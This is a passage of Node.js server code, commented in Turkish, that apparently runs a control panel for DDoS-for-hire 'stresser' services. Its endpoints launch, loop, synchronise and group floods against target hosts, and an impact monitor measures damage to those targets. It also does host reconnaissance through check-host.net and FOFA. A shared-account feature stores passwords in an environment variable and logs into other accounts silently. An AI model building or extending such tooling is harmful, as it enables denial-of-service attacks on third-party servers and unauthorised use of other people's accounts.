    saveState();
    console.log(`[loop/edit] ${loopId} -> time=${p.time} interval=${p.interval} concurrents=${p.concurrents} geo=${p.geo} group=${loop.group || '-'} note="${loop.note || ''}" (${sessionUser})`);
    res.json({
      status: 'success',
      params: { time: p.time, interval: p.interval, concurrents: p.concurrents, geo: p.geo },
      note: loop.note || '',
      group: loop.group || null
    });
  } catch (error) {
    handleEndpointError(res, error, 'Loop edit error');
  }
};
app.put('/api/stresse/loop/edit', loopEditHandler);
app.post('/api/stresse/loop/edit', loopEditHandler);

app.post('/api/stresse/loop/stop', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const sessionUser = sessions[sessionId]?.username;

    const { loopId } = req.body;
    if (!loopId) {
      // loopId verilmezse sadece bu hesaba ait loop'lari durdur ve kayittan sil
      const stoppedLoops = [];
      Object.keys(activeLoops).forEach((key) => {
        if (getLoopOwner(activeLoops[key]) !== sessionUser) return;
        stoppedLoops.push(activeLoops[key]);
        activeLoops[key].running = false;
        delete activeLoops[key];
      });
      saveState();
      stoppedLoops.forEach((loop) => notifyLoopRemoved(loop, 'durduruldu', {
        username: sessionUser,
        ip: getClientIp(req),
        stopDetail: 'Kullanıcı tüm loopları kapattı'
      }));
      return res.json({ status: 'success', message: 'Tum looplar durduruldu' });
    }

    // Baska hesabin loopId'si verilirse varligini ifsa etme: 404 don.
    if (!activeLoops[loopId] || getLoopOwner(activeLoops[loopId]) !== sessionUser) {
      return res.status(404).json({ status: 'error', message: 'Loop bulunamadi', loopId });
    }

    const loop = activeLoops[loopId];

    // Loop'u "loop modundan" cikar: yeni round baslatma, ama mevcut round'daki
    // saldirilari durdurma. Loop history'si hala "active" kalir; saldirilar
    // normal surelerince bittiginde cleanupExpiredAttacks onu "completed" yapar.
    activeLoops[loopId].running = false;
    delete activeLoops[loopId];
    saveState();
    notifyLoopRemoved(loop, 'durduruldu', {
      username: sessions[sessionId]?.username,
      ip: getClientIp(req),
      stopDetail: 'Kullanıcı loopu panelden çıkardı'
    });
    res.json({ status: 'success', message: 'Loop modu sonlandirildi; mevcut saldirilar devam ediyor', loopId });
  } catch (error) {
    handleEndpointError(res, error, 'Loop stop error');
  }
});

/**
 * GET /api/stresse/loops
 * Istegi yapan hesaba ait aktif loop listesini doner (hesap izolasyonu).
 * Owner'i cozulemeyen yetim loop'lar kimseye gosterilmez.
 */
/**
 * GET /api/method-congestion
 * Per-method slot congestion state observed from stresse.st launches.
 * Response: { "http-tempesta": { busy: true, since: 1720000000000 }, ... }
 */
app.get('/api/method-congestion', (req, res) => {
  const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
  if (!sessionId || !sessions[sessionId]) {
    return res.status(401).json({ status: 'error', message: 'Session required' });
  }
  res.json(getMethodCongestionSnapshot());
});

// Bilinen hesaplar: LOKI_KNOWN_ACCOUNTS="user1:pass1,user2:pass2".
// Ortak panelde bu hesaplar giris yapilmamis olsa bile /api/accounts
// listesinde gorunur; secildiklerinde arka planda otomatik login yapilir.
const KNOWN_ACCOUNTS = new Map();
(process.env.LOKI_KNOWN_ACCOUNTS || '').split(',').forEach((entry) => {
  const idx = entry.indexOf(':');
  if (idx <= 0) return;
  const u = entry.slice(0, idx).trim();
  const p = entry.slice(idx + 1).trim();
  if (u && p) KNOWN_ACCOUNTS.set(u, p);
});
if (KNOWN_ACCOUNTS.size) {
  console.log(`[accounts] Bilinen hesaplar: ${[...KNOWN_ACCOUNTS.keys()].join(', ')}`);
}

// Canli, token'i olan en taze session'i bul
function findLiveSessionForUser(username) {
  let best = null;
  Object.entries(sessions).forEach(([sid, session]) => {
    if (session?.username !== username || !session.apiToken) return;
    const created = new Date(session.createdAt || 0).getTime();
    if (!best || created > best.created) best = { sessionId: sid, created };
  });
  return best ? best.sessionId : null;
}

/**
 * GET /api/accounts
 * Canli oturumu olan hesaplar + bilinen (env tanimli) hesaplarin birlesimi.
 * Ortak panel: herhangi bir gecerli oturum, listedeki diger hesaplara
 * sifresiz gecebilir (sessionId'ler paylasilir).
 */
app.get('/api/accounts', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId || !sessions[sessionId]) {
      return res.status(401).json({ status: 'error', message: 'Session required' });
    }

    // Ayni username'e ait birden fazla session varsa en yenisini tut
    const byUser = new Map();
    Object.entries(sessions).forEach(([sid, session]) => {
      if (!session?.username || !session.apiToken) return;
      const prev = byUser.get(session.username);
      const created = new Date(session.createdAt || 0).getTime();
      if (!prev || created > prev.created) {
        byUser.set(session.username, { username: session.username, sessionId: sid, created });
      }
    });

    // Bilinen (env tanimli) ama canli oturumu olmayan hesaplari da ekle;
    // sessionId'siz gelirler, secilirken /api/accounts/ensure ile login olurlar.
    KNOWN_ACCOUNTS.forEach((_, username) => {
      if (!byUser.has(username)) byUser.set(username, { username, sessionId: null });
    });

    const accounts = [...byUser.values()]
      .map(({ username, sessionId: sid }) => ({ username, sessionId: sid }))
      .sort((a, b) => a.username.localeCompare(b.username));

    res.json({ status: 'success', accounts });
  } catch (error) {
    handleEndpointError(res, error, 'Accounts error');
  }
});

/**
 * POST /api/accounts/ensure
 * Body: { username }
 * Bilinen bir hesap icin canli session garanti eder: varsa mevcut sessionId
 * doner, yoksa sakli kimlik bilgisiyle arka planda login yapip yeni session
 * acar. Boylece hesap secimi o hesaba hic girilmemis olsa da calisir.
 */
app.post('/api/accounts/ensure', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId || !sessions[sessionId]) {
      return res.status(401).json({ status: 'error', message: 'Session required' });
    }
    const { username } = req.body || {};
    if (!username || !KNOWN_ACCOUNTS.has(username)) {
      return res.status(404).json({ status: 'error', message: 'Bilinmeyen hesap' });
    }

    const live = findLiveSessionForUser(username);
    if (live) {
      return res.json({ status: 'success', username, sessionId: live });
    }

    const newSessionId = `sess_${Date.now()}_${crypto.randomBytes(12).toString('base64url')}`;
    await performStresseLogin(newSessionId, username, KNOWN_ACCOUNTS.get(username));
    console.log(`[accounts] Arka planda login: ${username}`);
    res.json({ status: 'success', username, sessionId: newSessionId });
  } catch (error) {
    handleEndpointError(res, error, 'Account ensure error');
  }
});

/**
 * Grup uclari (ortak panel): liste / olustur / yeniden adlandir / sil.
 * POST kullaniliyor (LiteSpeed ModSecurity PUT/DELETE'i engelliyor).
 */
app.post('/api/invader/scan', (req, res) => {
  if (!watchAuth(req, res)) return;
  invaderRunChecks(req.body?.url || null).catch(() => {});
  res.json({ status: 'success', message: 'Tarama baslatildi' });
});

app.post('/api/invader/sites', async (req, res) => {
  if (!watchAuth(req, res)) return;
  const r = await invaderAddSite(req.body || {});
  if (r.error) return res.status(400).json({ status: 'error', message: r.error });
  res.json({ status: 'success', sites: r.sites });
});

app.post('/api/invader/sites/remove', (req, res) => {
  if (!watchAuth(req, res)) return;
  res.json({ status: 'success', sites: invaderRemoveSite(req.body?.name).sites });
});

app.get('/api/invader/history', (req, res) => {
  if (!watchAuth(req, res)) return;
  res.json({ status: 'success', records: invaderHistory(50) });
});

app.post('/api/invader/interval', (req, res) => {
  if (!watchAuth(req, res)) return;
  const min = parseInt(req.body?.min, 10);
  if (!Number.isFinite(min) || min < 1) return res.status(400).json({ status: 'error', message: 'Gecersiz aralik' });
  res.json({ status: 'success', ...invaderSetInterval(min) });
});

app.get('/api/invader/state', (req, res) => {
  if (!watchAuth(req, res)) return;
  res.json({ status: 'success', ...getInvaderState() });
});

app.get('/api/groups', (req, res) => {
  if (!watchAuth(req, res)) return;
  const u = sessions[req.headers['sessionid'] || req.headers['sessionId']]?.username;
  // Kati hesap izolasyonu: sadece kendi hesabinin gruplari.
  let mine = attackGroups.filter((g) => (g.owner || null) === (u || null));
  // Bos gruplari buda: hic loop'u kalmamis grup listede gorunmesin
  // (kayit defterinden de duser — hayalet isim birikimi olmaz).
  const busyNames = new Set(
    [
      ...Object.values(activeLoops)
        .filter((l) => (l.owner || sessions[l.sessionId]?.username) === u)
        .map((l) => l.group),
      ...Object.values(activeAttacks)
        .filter((a) => a.username === u)
        .map((a) => a.group)
    ]
      .map((g) => (g || '').toLocaleLowerCase('tr'))
      .filter(Boolean)
  );
  const alive = mine.filter((g) => busyNames.has(g.name.toLocaleLowerCase('tr')));
  if (alive.length !== mine.length) {
    const deadIds = new Set(mine.filter((g) => !alive.includes(g)).map((g) => g.id));
    attackGroups = attackGroups.filter((g) => !deadIds.has(g.id));
    saveGroups();
    mine = alive;
  }
  res.json({ status: 'success', groups: mine });
});

app.post('/api/groups', (req, res) => {
  if (!watchAuth(req, res)) return;
  const g = resolveGroupName(req.body?.name, sessions[req.headers['sessionid'] || req.headers['sessionId']]?.username);
  if (!g) return res.status(400).json({ status: 'error', message: 'Grup adı gerekli' });
  res.json({ status: 'success', groups: attackGroups });
});

app.post('/api/groups/rename', (req, res) => {
  if (!watchAuth(req, res)) return;
  const from = String(req.body?.from || '').trim();
  const to = String(req.body?.to || '').trim();
  if (!from || !to) return res.status(400).json({ status: 'error', message: 'from ve to gerekli' });
  const rnUser = sessions[req.headers['sessionid'] || req.headers['sessionId']]?.username;
  const grp = attackGroups.find((g) => g.name.toLocaleLowerCase('tr') === from.toLocaleLowerCase('tr') && ((g.owner || null) === (rnUser || null) || !g.owner));
  if (!grp) return res.status(404).json({ status: 'error', message: 'Grup bulunamadı' });
  // Mukerrer isim engeli: baska bir grup bu isimde olamaz (buyuk-kucuk harf duyarsiz)
  if (attackGroups.some((g) => g !== grp && g.name.toLocaleLowerCase('tr') === to.toLocaleLowerCase('tr'))) {
    return res.status(409).json({ status: 'error', message: 'Bu isimde bir grup zaten var' });
  }
  // Uye kayitlarini da guncelle
  Object.values(activeLoops).forEach((l) => { if (l.group && l.group.toLocaleLowerCase('tr') === from.toLocaleLowerCase('tr')) l.group = to; });
  Object.values(activeAttacks).forEach((a) => { if (a.group && a.group.toLocaleLowerCase('tr') === from.toLocaleLowerCase('tr')) a.group = to; });
  grp.name = to;
  saveGroups();
  saveState();
  res.json({ status: 'success', groups: attackGroups });
});

app.post('/api/groups/delete', (req, res) => {
  if (!watchAuth(req, res)) return;
  const name = String(req.body?.name || '').trim();
  if (!name) return res.status(400).json({ status: 'error', message: 'name gerekli' });
  const removed = deleteGroup(name, {
    username: sessions[req.headers['sessionid'] || req.headers['sessionId']]?.username,
    ip: getClientIp(req)
  });
  res.json({ status: 'success', groups: attackGroups, removedLoops: removed });
});

/**
 * Link Gozcusu (watch) uclari — ortak panel verisi; gecerli oturum yeterli.
 */
function watchAuth(req, res) {
  const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
  if (!sessionId || !sessions[sessionId]) {
    res.status(401).json({ status: 'error', message: 'Session required' });
    return false;
  }
  return true;
}

app.get('/api/watch/state', (req, res) => {
  if (!watchAuth(req, res)) return;
  res.json({ status: 'success', ...watchState() });
});

app.post('/api/watch/keywords', (req, res) => {
  if (!watchAuth(req, res)) return;
  const r = addKeyword(req.body?.keyword, req.body?.label);
  if (r.error) return res.status(400).json({ status: 'error', message: r.error });
  res.json({ status: 'success', keywords: r.keywords });
});

app.delete('/api/watch/keywords', (req, res) => {
  if (!watchAuth(req, res)) return;
  res.json({ status: 'success', keywords: removeKeyword(req.body?.keyword).keywords });
});
// LiteSpeed ModSecurity DELETE'i engelliyor: POST ile kaldirma uclari
app.post('/api/watch/keywords/remove', (req, res) => {
  if (!watchAuth(req, res)) return;
  res.json({ status: 'success', keywords: removeKeyword(req.body?.keyword).keywords });
});

app.post('/api/watch/sites', (req, res) => {
  if (!watchAuth(req, res)) return;
  const r = addSite(req.body?.site);
  if (r.error) return res.status(400).json({ status: 'error', message: r.error });
  res.json({ status: 'success', sites: r.sites });
});

app.delete('/api/watch/sites', (req, res) => {
  if (!watchAuth(req, res)) return;
  res.json({ status: 'success', sites: removeSite(req.body?.site).sites });
});
app.post('/api/watch/sites/remove', (req, res) => {
  if (!watchAuth(req, res)) return;
  res.json({ status: 'success', sites: removeSite(req.body?.site).sites });
});

app.post('/api/watch/scan', (req, res) => {
  if (!watchAuth(req, res)) return;
  if (!triggerScan()) {
    return res.status(409).json({ status: 'error', message: 'Tarama zaten sürüyor' });
  }
  res.json({ status: 'success', message: 'Tarama baslatildi' });
});

/**
 * GET /api/stresse/stats
 * Hesaba ozel sayaclar: aktif saldiri sayisi ve toplam kapasite.
 * Toplam = calisan loop'larin ayarlanmis concurrents toplami (tur arasi
 * bosluklardan etkilenmez, sabittir) + loopsuz ve suresi dolmamis saldirilar.
 */
app.get('/api/stresse/stats', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const sessionUser = sessions[sessionId]?.username;
    if (!sessionUser) {
      return res.status(401).json({ status: 'error', message: 'Session user not found' });
    }

    // Aktif saldirilar (bu hesaba ait, suresi dolmamis kayitlar)
    const now = Date.now();
    const activeCount = Object.values(activeAttacks).filter(
      (a) => a.username === sessionUser && new Date(a.expiresAt || 0).getTime() > now
    ).length;

    // Calisan loop'larin kapasitesi: loop ayakta oldugu surece sabit;
    // tur bitip yenisinin baslamasi arasindaki boslukta dusmez.
    let loopCapacity = 0;
    Object.values(activeLoops).forEach((loop) => {
      if (!loop.running) return;
      if (getLoopOwner(loop) !== sessionUser) return;
      loopCapacity += parseInt(loop.params?.concurrents, 10) || 0;
    });

    // Loopsuz (tek seferlik) ve suresi henuz dolmamis saldirilar.
    const nonLoopActive = Object.values(activeAttacks)
      .filter(
        (a) => a.username === sessionUser && !a.loopId &&
          new Date(a.expiresAt || 0).getTime() > now
      )
      .reduce((sum, a) => sum + (parseInt(a.concurrents, 10) || 1), 0);

    res.json({
      status: 'success',
      stats: {
        active: activeCount,
        total: loopCapacity + nonLoopActive
      }
    });
  } catch (error) {
    handleEndpointError(res, error, 'Stats error');
  }
});

app.get('/api/stresse/loops', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const sessionUser = sessions[sessionId]?.username;
    if (!sessionUser) {
      return res.status(401).json({ status: 'error', message: 'Session user not found' });
    }

    const loops = [];
    Object.entries(activeLoops).forEach(([key, value]) => {
      if (!value.running) return;
      const owner = getLoopOwner(value);
      if (!owner) {
        // Yetim loop: owner alani yok ve session'i silinmis. Ifsa etme, logla.
        console.warn(`[loops] Yetim loop gizlendi (owner cozulemedi): ${key}`);
        return;
      }
      if (owner !== sessionUser) return;
      // Ham sessionId'yi disari sizdirma; yerine owner koy.
      const { sessionId: _sid, resolveFirstRound: _r, ...publicLoop } = value;
      const syncInfo = sync.getGroupOf(key);
      loops.push({ loopId: key, ...publicLoop, owner, ...(syncInfo ? { syncGroup: syncInfo.id, syncTime: syncInfo.time, syncSize: syncInfo.size } : {}) });
    });

    res.json({ status: 'success', count: loops.length, loops, syncGroups: sync.getState() });
  } catch (error) {
    handleEndpointError(res, error, 'Loop list error');
  }
});

// ---- Senkron Tur (paylasilan saatli loop gruplari) ----

// Senkron baslat: { loopIds: [...], time: saniye }
app.post('/api/stresse/sync/start', (req, res) => {
  const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
  if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });
  const sessionUser = sessions[sessionId]?.username;
  if (!sessionUser) return res.status(401).json({ status: 'error', message: 'Session user not found' });

  const { loopIds, time } = req.body || {};
  // Sadece kendi loop'lari senkronlanabilir
  const owned = (Array.isArray(loopIds) ? loopIds : []).filter((id) => {
    const loop = activeLoops[id];
    return loop && getLoopOwner(loop) === sessionUser;
  });
  const result = sync.startGroup(owned, time);
  if (result.error) return res.status(400).json({ status: 'error', message: result.error });
  res.json({ status: 'success', groupId: result.groupId });
});

// Senkron boz: { groupId }
app.post('/api/stresse/sync/stop', (req, res) => {
  const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
  if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });
  const { groupId } = req.body || {};
  const result = sync.stopGroup(groupId);
  if (result.error) return res.status(404).json({ status: 'error', message: result.error });
  res.json({ status: 'success' });
});

// Tek loop'u senkrondan cikar: { loopId }
app.post('/api/stresse/sync/remove', (req, res) => {
  const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
  if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });
  const { loopId } = req.body || {};
  const result = sync.removeLoop(loopId);
  if (result.error) return res.status(404).json({ status: 'error', message: result.error });
  res.json({ status: 'success' });
});

/**
 * GET /api/stresse/history/:username
 * Kullanicinin saldiri gecmisini doner.
 */
app.get('/api/stresse/history/:username', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { username } = req.params;

    // Sadece kendi gecmisini gorebilir
    const sessionUser = sessions[sessionId]?.username;
    if (sessionUser && sessionUser !== username) {
      return res.status(403).json({ status: 'error', message: 'Forbidden' });
    }

    const records = Object.values(attackHistory)
      .filter((h) => h.username === username)
      .sort((a, b) => new Date(b.startedAt).getTime() - new Date(a.startedAt).getTime());

    res.json({ status: 'success', count: records.length, records });
  } catch (error) {
    handleEndpointError(res, error, 'History fetch error');
  }
});

/**
 * DELETE /api/stresse/history
 * Body: { ids?: string[], all?: boolean }
 *
 * Kullanicinin saldiri gecmisini toplu olarak siler.
 */
app.delete('/api/stresse/history', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const sessionUser = sessions[sessionId]?.username;
    if (!sessionUser) {
      return res.status(401).json({ status: 'error', message: 'Session user not found' });
    }

    const { ids, all = false } = req.body;
    let removed = 0;

    if (all === true) {
      Object.keys(attackHistory).forEach((historyId) => {
        if (attackHistory[historyId].username === sessionUser) {
          delete attackHistory[historyId];
          removed++;
        }
      });
    } else if (Array.isArray(ids) && ids.length > 0) {
      ids.forEach((historyId) => {
        const record = attackHistory[historyId];
        if (record && record.username === sessionUser) {
          delete attackHistory[historyId];
          removed++;
        }
      });
    } else {
      return res.status(400).json({ status: 'error', message: 'ids array or all:true required' });
    }

    saveState();
    console.log(`[history] ${sessionUser} icin ${removed} gecmis kaydi silindi`);
    res.json({ status: 'success', removed });
  } catch (error) {
    handleEndpointError(res, error, 'History delete error');
  }
});

/**
 * GET /api/stresse/loop/:loopId
 * Tek loop detayini doner.
 */
app.get('/api/stresse/loop/:loopId', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const sessionUser = sessions[sessionId]?.username;
    if (!sessionUser) {
      return res.status(401).json({ status: 'error', message: 'Session user not found' });
    }

    const { loopId } = req.params;
    const loop = activeLoops[loopId];
    // Baska hesabin loopId'si istenirse varligini ifsa etme: 404 don.
    if (!loop || getLoopOwner(loop) !== sessionUser) {
      return res.status(404).json({ status: 'error', message: 'Loop bulunamadi', loopId });
    }

    // Ham sessionId'yi disari sizdirma; yerine owner koy.
    const { sessionId: _sid, resolveFirstRound: _r, ...publicLoop } = loop;
    res.json({ status: 'success', loopId, ...publicLoop, owner: sessionUser });
  } catch (error) {
    handleEndpointError(res, error, 'Loop status error');
  }
});

// =====================
// CHECK / RECON TOOLS
// =====================

/**
 * GET /api/check-host?host=...&type=ping|http|tcp|udp|dns
 */
app.get('/api/check-host', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });
    const { host, type = 'ping' } = req.query;
    if (!host) return res.status(400).json({ status: 'error', message: 'host required' });

    const validTypes = ['ping', 'http', 'tcp', 'udp', 'dns'];
    if (!validTypes.includes(type)) {
      return res.status(400).json({ status: 'error', message: 'Invalid type. Use: ping, http, tcp, udp, dns' });
    }

    // 1. İlk istek: request_id al
    const initResponse = await axios.get(`https://check-host.net/check-${type}`, {
      params: { host, max_nodes: 20 },
      headers: {
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0'
      },
      timeout: 20000
    });

    const requestId = initResponse.data.request_id;
    if (!requestId) {
      return res.json({ status: 'success', data: initResponse.data });
    }

    // 2. Sonuçları bekle (max 15 saniye, 3 saniyede bir kontrol)
    let results = null;
    const maxAttempts = 5;
    for (let i = 0; i < maxAttempts; i++) {
      await new Promise(r => setTimeout(r, 3000));
      const resultResponse = await axios.get(`https://check-host.net/check-result/${requestId}`, {
        headers: { 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0' },
        timeout: 15000
      });

      if (resultResponse.data && Object.keys(resultResponse.data).length > 0) {
        results = resultResponse.data;
        break;
      }
    }

    res.json({
      status: 'success',
      host,
      type,
      request_id: requestId,
      results: results || {},
      raw: initResponse.data
    });
  } catch (error) {
    console.error('Check-host error:', error.message);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

/**
 * GET /api/impact
 * Giris yapan hesabin takip edilen hedeflerinin etki olcumleri (Etki Monitoru).
 */
app.get('/api/impact', (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });
    const username = sessions[sessionId]?.username;
    if (!username) return res.status(401).json({ status: 'error', message: 'Invalid session' });

    res.json({ status: 'success', targets: getImpactForUser(username) });
  } catch (error) {
    console.error('Impact error:', error.message);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

/**
 * GET /api/ping-pe?host=...
 */
app.get('/api/ping-pe', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });
    const { host } = req.query;
    if (!host) return res.status(400).json({ status: 'error', message: 'host required' });

    // ping.pe does not expose a public API; return a reference link
    res.json({
      status: 'success',
      url: `https://ping.pe/${host}`,
      note: 'Open this link in a browser for MTR results'
    });
  } catch (error) {
    res.status(500).json({ status: 'error', message: error.message });
  }
});

/**
 * GET /api/fofa?query=...
 */
app.get('/api/fofa', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });
    const { query, email, key, size = 10 } = req.query;
    if (!query) return res.status(400).json({ status: 'error', message: 'query required' });
    if (!email || !key) {
      return res.status(400).json({ status: 'error', message: 'FOFA email and API key required' });
    }

    const encodedQuery = Buffer.from(query).toString('base64');
    const response = await axios.get('https://fofa.info/api/v1/search/all', {
      params: { email, key, qbase64: encodedQuery, size },
      timeout: 30000
    });

    res.json({ status: 'success', data: response.data });
  } catch (error) {
    console.error('FOFA error:', error.message);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

// =====================
// LIVE ATTACK STREAM (SSE)
// =====================

// SSE hub'lari: username basina TEK upstream poller calisir, tum bagli
// client'lara broadcast edilir. Boylece N sekme = N x 2 upstream istegi yerine
// 3sn'de toplam 1-2 istek atilir.
// username -> { clients: Set<res>, sessionId, timer, lastOngoing, lastUser, consecutiveErrors, tickCount }
const liveHubs = new Map();

// Tum client'lara yazar; kapali client'a yazma hatasinda o client'i set'ten dusurur.
function liveHubBroadcast(hub, chunk) {
  hub.clients.forEach((clientRes) => {
    try {
      clientRes.write(chunk);
    } catch (err) {
      hub.clients.delete(clientRes);
    }
  });
}

// Paylasimli poller tick'i: /ongoing her tick, /user sadece ilk tick ve her
// 10. tickte cekilir. 3 ardisik hatadan sonra aralik 10sn'ye duser (backoff),
// ilk basarida 3sn'ye doner.
// Taze kayit defteri satirlarini (stresse pending/dogrulanmis + rackghost)
// listeye ekler. liveHubTick ve pokeLiveHub ortak kullanir: upstream
// beklenmeden satirin aninda dusmesinin ozu budur. null-id butcesiyle cift
// satir engellenir; sahiplik (owner) hesap bazli filtrelenir.
function appendFreshRegistryRows(ongoingData, username) {
  const nowMs = Date.now();
  // RackGhost taze kayitlari (henuz upstream ongoing'e dusmemis olanlar)
  if (rackghost.isConfigured()) {
    const seenRg = new Set(ongoingData.filter((r) => r && r.provider === 'rackghost').map((r) => r.attack_id));
    Object.values(activeAttacks).forEach((a) => {
      if (a.provider !== 'rackghost') return;
      const id = `rg_${a.attackId}`;
      if (seenRg.has(id)) return;
      const owner = a.username || sessions[a.sessionId]?.username || null;
      if (owner && owner !== username) return; // baska hesabin saldirisi
      const tlSec = Math.round((new Date(a.expiresAt || 0).getTime() - nowMs) / 1000);
      if (!Number.isFinite(tlSec) || tlSec <= 0) return;
      ongoingData.push({
        attack_id: id,
        target: `${String(a.host || '').replace(/\/+$/, '')}:${a.port}`,
        method: a.method,
        timeLeft: String(tlSec),
        count: a.concurrents || 1,
        layer: a.layer || 'L4',
        provider: 'rackghost'
      });
    });
  }
  // Taze kayitli stresse saldirilari: upstream /ongoing gec guncellenir (5-15sn);
  // kayit defterinden aninda goster; upstream gorunur olunca ayni satir devam eder.
  const seenIds = new Set(ongoingData.map((r) => String(r.attack_id || '')));
  // Upstream'in attack_id'siz (null) satirlari ID tekillestirmesinden kacar;
  // ayni saldiri iki kez sayilmasin diye hedef+yontem butcesi uygulanir.
  const nullIdBudget = new Map();
  ongoingData.forEach((r) => {
    if (r.attack_id) return;
    const sig = rowSigKey(r.target || r.host, r.method);
    if (sig) nullIdBudget.set(sig, (nullIdBudget.get(sig) || 0) + 1);
  });
  Object.values(activeAttacks).forEach((a) => {
    if (a.provider === 'rackghost') return; // onlar yukarida
    const owner = a.username || sessions[a.sessionId]?.username;
    if (owner !== username) return;
    const id = String(a.attackId);
    if (seenIds.has(id)) return;
    const target = a.layer === 'L7' ? `https://${a.host}/:${a.port}` : `${a.host}:${a.port}`;
    // Upstream ayni saldiriyi id'siz satirla zaten gosteriyorsa ekleme
    const sig = rowSigKey(target, a.method);
    if (sig && (nullIdBudget.get(sig) || 0) > 0) {
      nullIdBudget.set(sig, nullIdBudget.get(sig) - 1);
      return;
    }
    const tlSec = Math.round((new Date(a.expiresAt || 0).getTime() - nowMs) / 1000);
    if (!Number.isFinite(tlSec) || tlSec <= 0) return;
    ongoingData.push({
      attack_id: id,
      target,
      method: a.method,
      timeLeft: String(tlSec),
      count: a.concurrents || 1,
      ...(a.loopId ? { loopId: a.loopId } : {}),
      ...(a.group ? { group: a.group } : {})
    });
  });
}

// RackGhost satir gorunurlugu (hesap izolasyonu): ID ile, kacamazsa
// hedef+method imzasiyla sahip cozulur. Protokol iki tarafta da soyulur.
// Defterde olmayanlar (RG panelinden baslatilanlar) herkese gorunur.
// liveHubTick ve /ongoing poll ucu ortak kullanir.
function makeRgVisibility() {
  const byId = {};
  const bySig = {};
  Object.values(activeAttacks).forEach((a) => {
    if (a.provider !== 'rackghost') return;
    const owner = a.username || sessions[a.sessionId]?.username || null;
    byId[`rg_${a.attackId}`] = owner;
    const h = String(a.host || '').toLowerCase().replace(/^https?:\/\//, '').replace(/\/+$/, '');
    if (h && a.method) bySig[`${h}|${String(a.method).toUpperCase()}`] = owner;
  });
  return (row, username) => {
    let owner = byId[row.attack_id];
    if (owner === undefined) {
      const h = String(row.target || '').toLowerCase().replace(/^https?:\/\//, '').split(':')[0];
      owner = bySig[`${h}|${String(row.method || '').toUpperCase()}`];
    }
    return !owner || owner === username;
  };
}

async function liveHubTick(hub, username) {
  if (hub.clients.size === 0) return;
  // Poke ile normal tick cakismasini onle (iki tick paralel kosarsa iki timer
  // zinciri olusur — biri ezilir, biri yasamaya devam eder).
  // Takili tick kilidi: normalde fetch timeout'lari bitirir; yine de 60sn'yi
  // asan tick'i takilmis say, kilidi kir (aksi hub sonsuza susar).
  if (hub.tickInFlight) {
    if (Date.now() - (hub.tickStartedAt || 0) > 60000) {
      console.warn('[liveHub] tick 60sn+ takili kalmis, kilit kiriliyor');
      hub.tickInFlight = false;
    } else {
      return;
    }
  }
  hub.tickInFlight = true;
  hub.tickStartedAt = Date.now();
  hub.tickCount += 1;
  const fetchUser = hub.tickCount === 1 || hub.tickCount % 10 === 0;
  let user = null;
  let ongoingData;
  try {
    const client = getClient(hub.sessionId);
    // Sert timeout ZORUNLU: zaman asimisiz bir istek takilirsa tick zinciri
    // (timer tick sonunda kuruluyor) tamamen olur ve hub sessizce donar —
    // kullanicinin "saldiriyi gec goruyorum / yenilemek zorundayim" bug'i.
    const requests = [client.get(`/ongoing/${username}`, { timeout: 15000 })];
    if (fetchUser) requests.push(client.get(`/user/${username}`, { timeout: 15000 }));
    const [ongoing, userRes] = await Promise.all(requests);
    user = userRes;
    // Upstream array disi bir sey dondururse (challenge HTML'i, hata objesi) hata say
    if (!Array.isArray(ongoing.data)) throw new Error('upstream array disi yanit');
    // Not cozumleme ID'den bagimsiz oldugu icin satir /ongoing'de gorunur
    // gorunmez not da ayni tick'te hazirdir (gec gelme sorunu yok).
    ongoingData = ongoing.data.map((item) => {
      const local = activeAttacks[item.attack_id || item.id];
      let next = item;
      // Upstream kuyruk payini gosterme: gercek sureyi asma
      if (local) {
        const t = parseInt(local.time, 10) || 0;
        const tl = parseInt(item.timeLeft, 10);
        if (t > 0 && Number.isFinite(tl) && tl > t) {
          next = { ...next, timeLeft: t };
        }
        // Grup goruntusu icin: loopId ve group frontend'e tasinir
        if (local.loopId) next = { ...next, loopId: local.loopId };
        if (local.group) next = { ...next, group: local.group };
      }
      const note = resolveNoteForRow(username, item.target || item.host, item.method);
      return note ? { ...next, note } : next;
    });
    hub.consecutiveErrors = 0;
    // Basarili tick: bu session calisiyor demektir; iyi bilinen session olarak isle.
    hub.lastGoodSessionId = hub.sessionId;
    if (user) hub.lastUser = user.data;
